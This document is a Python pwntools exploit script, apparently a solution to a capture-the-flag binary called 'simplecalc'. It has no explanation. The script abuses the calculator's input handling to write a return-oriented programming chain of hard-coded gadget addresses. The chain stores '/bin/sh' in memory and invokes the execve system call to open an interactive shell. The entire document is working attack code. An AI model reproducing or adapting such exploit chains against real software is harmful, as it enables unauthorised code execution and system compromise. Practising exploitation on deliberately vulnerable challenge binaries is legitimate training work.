from pwn import *

syscall = 0x0000000000400488
popRdx =  0x0000000000437a85
popRsi =  0x0000000000401c87
popRdi =  0x0000000000401b73
popRax =  0x000000000044db34
mov =     0x000000000044526e # mov qword ptr [rax], rdx ; ret
ret =     0x00000000004001c7

gdbcmds = '''
b *(main+455)
r
'''
proc = process('./simplecalc')
#proc = gdb.debug('./simplecalc', gdbscript=gdbcmds)

def send_address(address):
    address = int(address)

    first_half = address >> 32 
    second_half = address & 0xFFFFFFFF 
    
    num1 = first_half // 2 
    num2 = first_half - num1
    num3 = second_half // 2
    num4 = second_half - num3
    num1 += 1000
    num2 -= 1000
    num3 += 1000
    num4 -= 1000
    
    print("NUMS:", num1, num2, num3, num4)
    
    proc.recvuntil(b">")
    proc.sendline(b"1")
    proc.recvuntil(b":")
    proc.sendline(str(num3).encode('utf-8'))
    proc.recvuntil(b":")
    proc.sendline(str(num4).encode('utf-8'))
    
    proc.recvuntil(b">")
    proc.sendline(b"1")
    proc.recvuntil(b":")
    proc.sendline(str(num1).encode('utf-8'))
    proc.recvuntil(b":")
    proc.sendline(str(num2).encode('utf-8'))


proc.recvuntil(b":")
proc.sendline(b"100")

for i in range(9):
    send_address(0x0000000000000000) # 0x000003e8000003e8
                 
                 
send_address(ret)

send_address(popRax)
send_address(0x00000000006c1000)
send_address(popRdx)
send_address(0x0068732f6e69622f) # /bin/sh\x00
send_address(mov)

send_address(popRax)
send_address(0x000000000000003b)

send_address(popRdi)
send_address(0x00000000006c1000)

send_address(popRsi)
send_address(0x0000000000000000)

send_address(popRdx)
send_address(0x0000000000000000)

send_address(syscall)

proc.recvuntil(b">")
proc.sendline(b"5")
proc.interactive()
